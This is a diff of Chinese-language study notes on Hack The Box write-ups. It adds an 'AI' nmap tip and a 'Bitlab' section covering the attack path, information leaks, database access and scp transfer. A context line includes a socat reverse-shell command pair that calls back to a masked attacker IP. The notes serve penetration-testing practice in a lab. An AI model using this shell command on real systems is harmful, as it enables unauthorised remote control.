@@ -15,6 +15,7 @@ Paper：[Write-ups for 0xrick's hack-the-box](https://0xrick.github.io/categorie
 
 知识点：
 
+- Nmap：-sC等价为--script=default，默认调取已知端口的脚本，输出相应服务的详细信息。
 - 目录枚举：使用gobuster，`gobuster dir -u http://ai.htb/ -w /usr/share/wordlists/dirb/common.txt -x php`
 - 文字转MP3：[https://ttsmp3.com](https://ttsmp3.com)，有中国女声，可读中文。
 - MP3转WAV：使用ffmpeg，`ffmpeg -i test.mp3 test.wav`。
@@ -22,7 +23,6 @@ Paper：[Write-ups for 0xrick's hack-the-box](https://0xrick.github.io/categorie
 
 思考：
 
-- Nmap：-sC等价为--script=default，并无存在意义。
 - 目录枚举：除了gobuster，还有dirb、dirsearch、wfuzz等工具。wfuzz是web模糊处理工具，类似于Burpsuite的intruder功能。
 - SQL注入：通过语音识别用户上传的wav文件，执行并输出结果。场景很新颖，hard CTF-style。
 - Linux提权：发现Apache Tomcat服务，作者首先确定了此服务无利用价值后，进而深入研究了其Tomcat jdwp服务。
@@ -47,3 +47,27 @@ Paper：[Write-ups for 0xrick's hack-the-box](https://0xrick.github.io/categorie
 - 源码泄露：`.xxx.php.swp`文件是异常退出vi/vim编辑器时产生的文件，使用`vi/vim -r xxx`恢复，除此之外，还有`.xxx.php.swo`、`.xxx.php.swn`等以sw+最后一个字母依次递增的后缀文件，各种编辑器异常退出产生的文件后缀不唯一。
 - TTY交互式终端：使用socat，```#Listener: socat file:`tty`,raw,echo=0 tcp-listen:4444 #Victim: socat exec:`bash -li`,pty,stderr,setsid,sigint,sane tcp:1xx.xxx.xxx.xxx:4444```。
 - Linux提权：只要是以root权限运行的服务，都要逐一排查。如果是PHP、Python等启动的程序，要进行代码审计，重点发现文件包含、命令执行漏洞，寻找输入点，并借此进程获取root。
+
+### Bitlab
+
+环境概述：Linux、Medium、30'、07 Sep 2019
+
+渗透流程：Nmap -> Web Enumeration -> File Upload –> RCE –> Shell as www-data -> Database Access –> Clave’s Password –> SSH as Clave –> User Flag -> Reversing RemoteConnection.exe –> Root’s Password –> SSH as Root –> Root Flag
+
+知识点：
+
+- 信息泄露：使用Nmap发现80端口存在robots.txt，-sC参数可以识别并输出具体内容；robots.txt泄露了大量disallow路径。
+- 信息泄露：使用F12或开发者工具，查看HTML源代码，可能存在敏感JS代码。
+- 路径关联：robots里的某路径和主仓库路径关联，使用同一静态文件（图片等）可快速确定。
+- 数据库：连接数据库的工具不单只有特定的客户端程序，常见的编程语言均内置数据库连接函数，可以巧用。
+- 数据库：PostgreSQL安装完后默认自带一个命令行工具psql。
+- 文件传输：在反弹的伪终端中，使用scp下载文件，`scp clave@bitlab.htb:/home/clave/RemoteConnection.exe ./`。
+
+思考：
+
+- Nmap：-sC和-sV倒不如直接使用-A，DNS、路由等信息也加入识别。
+- 信息泄露：在厂商的授权测试中，巧用Github搜索可能会得到意外的代码信息。
+- 文件定位：Windows上传某一文件却不知上传路径时，可将文件命名一特殊名，利用`dir /s/b filename*`快速定位；Linux则可以利用grep。
+- 数据库：若环境支持PHP，可以利用adminer，支持MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, SimpleDB, Elasticsearch, MongoDB。
+- URL格式：`postgres://user:pass@host.com:5432/path?k=v#f`，包含了模式（协议）、验证信息、主机、端口、路径、查询参数和查询片段。注意：`@`和`#`。
+- 二进制程序：在逆向程序前可先使用关键字进行strings匹配。
